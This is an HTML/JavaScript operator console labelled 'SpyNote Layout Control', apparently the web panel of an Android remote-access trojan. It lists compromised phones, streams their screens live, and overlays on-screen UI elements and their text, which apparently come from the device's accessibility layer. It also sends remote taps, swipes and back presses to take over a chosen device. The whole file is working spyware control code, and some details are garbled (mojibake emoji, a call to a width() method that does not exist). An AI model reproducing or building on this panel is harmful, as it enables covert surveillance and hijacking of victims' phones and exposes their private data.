<!DOCTYPE html>
<html>
<head>
    <title>üéØ SpyNote Layout Control</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="/socket.io/socket.io.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: Arial, sans-serif; 
            background: linear-gradient(135deg, #0f0f23, #1a1a2e); 
            color: white; height: 100vh; overflow: hidden;
        }
        #devices {
            position: fixed; top: 10px; left: 10px; 
            background: rgba(0,20,40,0.95); padding: 15px; 
            max-height: 80vh; overflow-y: auto; width: 280px; 
            border-radius: 15px; backdrop-filter: blur(20px); border: 1px solid #00ff88;
        }
        .device { padding: 15px; margin: 10px 0; background: #1a1a2e; cursor: pointer; 
            border-radius: 10px; transition: all 0.3s; border-left: 4px solid #444; }
        .device:hover { background: #2a2a4e; border-left-color: #00ff88; transform: translateX(5px); }
        .active { background: linear-gradient(45deg, #00ff88, #00cc66) !important; color: #000; border-left-color: #006644 !important; }
        .disconnected { opacity: 0.5; border-left-color: #ff4444; }

        #phone-frame {
            width: 420px; height: 850px; margin: 20px auto; 
            background: linear-gradient(145deg, #1a1a2e, #0f0f23); 
            border: 30px solid #2a2a4e; border-radius: 60px; 
            position: relative; cursor: pointer; touch-action: none;
            box-shadow: 0 30px 60px rgba(0,0,0,0.7), inset 0 0 20px rgba(0,255,136,0.1);
        }
        #screen-canvas { 
            width: 100%; height: 100%; background: #000; border-radius: 25px;
            image-rendering: -webkit-optimize-contrast;
        }
        #overlay-canvas {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            pointer-events: none; border-radius: 25px;
        }
        #fps-counter { position: fixed; top: 10px; right: 160px; font-size: 13px; color: #00ff88; font-weight: bold; }
        #status { position: fixed; top: 10px; right: 10px; background: rgba(0,20,40,0.95); 
            padding: 15px; border-radius: 10px; font-size: 13px; border: 1px solid #00ff88; }
        #controls { text-align: center; position: fixed; bottom: 20px; 
            left: 50%; transform: translateX(-50%); }
        button {
            padding: 18px 35px; margin: 0 15px; background: linear-gradient(45deg, #00ff88, #00cc66); 
            color: #000; border: none; border-radius: 30px; cursor: pointer; 
            font-size: 16px; font-weight: bold; transition: all 0.3s;
            box-shadow: 0 8px 25px rgba(0,255,136,0.4);
        }
        button:hover { transform: translateY(-3px); box-shadow: 0 12px 35px rgba(0,255,136,0.6); }
        #element-info {
            position: fixed; top: 80px; right: 10px; 
            background: rgba(0,20,40,0.95); padding: 15px; 
            border-radius: 10px; max-width: 300px; max-height: 400px;
            overflow-y: auto; border: 1px solid #444; display: none;
        }
        .ui-element-hover {
            box-shadow: 0 0 0 3px #00ff88 inset !important;
            background: rgba(0,255,136,0.3) !important;
        }
    </style>
</head>
<body>
    <div id="devices">
        <h3>üéØ Devices (Layout Mode)</h3>
        <div id="device-list">Loading...</div>
    </div>
    
    <div id="status">
        <div>Status: <span id="connectionStatus">Connecting...</span></div>
        <div>FPS: <span id="fps">0</span> | Elements: <span id="elementCount">0</span> | Device: <span id="selectedDevice">-</span></div>
    </div>
    <div id="fps-counter">FPS: 0 | Elements: 0</div>
    
    <div id="element-info">
        <h4>üì± Element Info</h4>
        <div id="element-details"></div>
    </div>

    <div id="phone-frame">
        <canvas id="screen-canvas"></canvas>
        <canvas id="overlay-canvas"></canvas>
    </div>

    <div id="controls">
        <button onclick="sendBack()">üîô Back</button>
        <button onclick="clearOverlay()">üßπ Clear</button>
        <button onclick="toggleFullScreen()">üì± Fullscreen</button>
    </div>

    <script>
        const socket = io();
        let currentDevice = null;
        let deviceWidth = 1080, deviceHeight = 1920;
        let lastFrameTime = 0, frameCount = 0;
        let uiElements = [];
        let hoveredElement = null;

        const screenCanvas = document.getElementById('screen-canvas');
        const overlayCanvas = document.getElementById('overlay-canvas');
        const screenCtx = screenCanvas.getContext('2d');
        const overlayCtx = overlayCanvas.getContext('2d');
        const phoneFrame = document.getElementById('phone-frame');
        const deviceList = document.getElementById('device-list');
        const connectionStatus = document.getElementById('connectionStatus');
        const selectedDeviceSpan = document.getElementById('selectedDevice');
        const fpsCounter = document.getElementById('fps-counter');
        const fpsDisplay = document.getElementById('fps');
        const elementCount = document.getElementById('elementCount');
        const elementInfo = document.getElementById('element-details');
        const elementInfoDiv = document.getElementById('element-info');

        // Socket events
        socket.on('connect', () => {
            connectionStatus.textContent = '‚úÖ Connected (Layout Mode)';
            connectionStatus.style.color = '#00ff88';
        });

        socket.on('screen-update', updateScreen); // Backward compatibility
        socket.on('layout-frame', (data) => {
            if (data.deviceId !== currentDevice) return;
            updateScreen(data);
            updateUIElements(data.uiElements || []);
        });

        function updateScreen(data) {
            try {
                deviceWidth = data.width;
                deviceHeight = data.height;
                
                const img = new Image();
                img.onload = () => {
                    const rect = phoneFrame.getBoundingClientRect();
                    screenCanvas.width = rect.width;
                    screenCanvas.height = rect.height;
                    overlayCanvas.width = rect.width;
                    overlayCanvas.height = rect.height;
                    
                    screenCtx.imageSmoothingEnabled = false;
                    screenCtx.drawImage(img, 0, 0, rect.width, rect.height);
                    
                    frameCount++;
                    const now = performance.now();
                    if (now - lastFrameTime >= 1000) {
                        const fps = Math.round(frameCount * 1000 / (now - lastFrameTime));
                        fpsDisplay.textContent = fps;
                        fpsCounter.innerHTML = `FPS: ${fps} | Elements: ${uiElements.length}`;
                        elementCount.textContent = uiElements.length;
                        frameCount = 0;
                        lastFrameTime = now;
                    }
                };
                img.src = 'data:image/jpeg;base64,' + data.screenshot;
            } catch (e) {
                console.error('Screen update error:', e);
            }
        }

        function updateUIElements(elements) {
            uiElements = elements.map(el => ({
                bounds: el.bounds,
                text: el.text || '',
                contentDesc: el.contentDesc || '',
                className: el.className || '',
                clickable: el.clickable || false
            }));
        }

        // üî• PERFECT LAYOUT OVERLAY RENDERING
        function renderOverlay() {
            const rect = phoneFrame.getBoundingClientRect();
            overlayCtx.clearRect(0, 0, overlayCanvas.width, overlayCanvas.height);
            
            overlayCtx.strokeStyle = 'rgba(0,255,136,0.8)';
            overlayCtx.lineWidth = 2;
            overlayCtx.font = '14px Arial';
            overlayCtx.fillStyle = '#00ff88';
            overlayCtx.textAlign = 'center';
            
            const scaleX = deviceWidth / rect.width;
            const scaleY = deviceHeight / rect.height;
            
            uiElements.forEach((el, idx) => {
                const x = (el.bounds.left / scaleX);
                const y = (el.bounds.top / scaleY);
                const w = (el.bounds.right - el.bounds.left) / scaleX;
                const h = (el.bounds.bottom - el.bounds.top) / scaleY;
                
                // Draw bounds
                overlayCtx.strokeRect(x, y, w, h);
                
                // Draw text label
                const label = (el.text || el.contentDesc).substring(0, 15) || 'Element';
                overlayCtx.fillText(label, x + w/2, y + h/2 + 5);
                
                // Clickable highlight
                if (el.clickable) {
                    overlayCtx.fillStyle = 'rgba(0,255,0,0.1)';
                    overlayCtx.fillRect(x, y, w, h);
                }
            });
        }

        // Continuous overlay render
        setInterval(renderOverlay, 50);

        fetch('/devices').then(r => r.json()).then(updateDeviceList);

        function updateDeviceList(devices) {
            deviceList.innerHTML = devices.length ? 
                devices.map(([id, info]) => `
                    <div class="device ${!info.connected ? 'disconnected' : ''}" 
                         onclick="selectDevice('${id}', this)"
                         title="${info.mode || 'Standard'}">
                        <b>${info.model || id.slice(0,8)}</b><br>
                        <small>${info.brand || ''} ${info.version || ''}</small>
                        <div style="margin-top:5px;font-size:11px;">
                            ${info.connected ? 'üü¢ LIVE' : 'üî¥ OFF'} 
                            ${info.mode === 'LAYOUT' ? 'üéØ LAYOUT' : ''}
                        </div>
                    </div>
                `).join('') : 'No devices';
        }

        function selectDevice(deviceId, el) {
            currentDevice = deviceId;
            selectedDeviceSpan.textContent = deviceId.slice(0,8);
            document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
            el.classList.add('active');
            socket.emit('control', { deviceId });
        }

        // üî• PERFECT TOUCH/SCALE COORDINATES
        function getScaledCoords(clientX, clientY) {
            const rect = phoneFrame.getBoundingClientRect();
            const scaleX = deviceWidth / rect.width;
            const scaleY = deviceHeight / rect.height;
            return {
                x: Math.floor((clientX - rect.left) * scaleX),
                y: Math.floor((clientY - rect.top) * scaleY)
            };
        }

        // Mouse/Touch Events
        let startX = 0, startY = 0, dragging = false;

        ['mousedown', 'touchstart'].forEach(event => {
            phoneFrame.addEventListener(event, e => {
                e.preventDefault();
                dragging = true;
                const coords = getScaledCoords(
                    e.touches?.[0]?.clientX || e.clientX,
                    e.touches?.[0]?.clientY || e.clientY
                );
                startX = coords.x; startY = coords.y;
                sendTap(startX, startY);
            });
        });

        ['mousemove', 'touchmove'].forEach(event => {
            phoneFrame.addEventListener(event, e => {
                if (!dragging || !currentDevice) return;
                e.preventDefault();
                const coords = getScaledCoords(
                    e.touches?.[0]?.clientX || e.clientX,
                    e.touches?.[0]?.clientY || e.clientY
                );
                sendSwipe(startX, startY, coords.x, coords.y);
            });
        });

        ['mouseup', 'touchend'].forEach(event => {
            phoneFrame.addEventListener(event, e => dragging = false);
        });

        function sendTap(x, y) {
            if (!currentDevice) return;
            socket.emit('control', { 
                deviceId: currentDevice, 
                action: 'tap', 
                x, y 
            });
            console.log('üëÜ Tap:', x, y);
        }

        function sendSwipe(sx, sy, ex, ey) {
            if (!currentDevice) return;
            socket.emit('control', { 
                deviceId: currentDevice, 
                action: 'swipe', 
                startX: sx, startY: sy, endX: ex, endY: ey 
            });
        }

        function sendBack() {
            if (!currentDevice) return;
            socket.emit('control', { deviceId: currentDevice, action: 'back' });
        }

        function clearOverlay() {
            overlayCtx.clearRect(0, 0, overlayCanvas.width, overlayCanvas.height);
        }

        function toggleFullScreen() {
            if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen();
            } else {
                document.exitFullscreen();
            }
        }

        // üî• HOVER ELEMENT INFO
        phoneFrame.addEventListener('mousemove', (e) => {
            const coords = getScaledCoords(e.clientX, e.clientY);
            hoveredElement = uiElements.find(el => 
                coords.x >= el.bounds.left && coords.x <= el.bounds.right &&
                coords.y >= el.bounds.top && coords.y <= el.bounds.bottom
            );
            
            if (hoveredElement) {
                elementInfo.innerHTML = `
                    <strong>${hoveredElement.text || hoveredElement.contentDesc || 'Element'}</strong><br>
                    <small>${hoveredElement.className}</small><br>
                    Bounds: ${hoveredElement.bounds.left},${hoveredElement.bounds.top} ${hoveredElement.bounds.width()}x${hoveredElement.bounds.height()}<br>
                    ${hoveredElement.clickable ? '‚úÖ CLICKABLE' : '‚ö†Ô∏è Not clickable'}
                `;
                elementInfoDiv.style.display = 'block';
            } else {
                elementInfoDiv.style.display = 'none';
            }
        });
    </script>
</body>
</html>
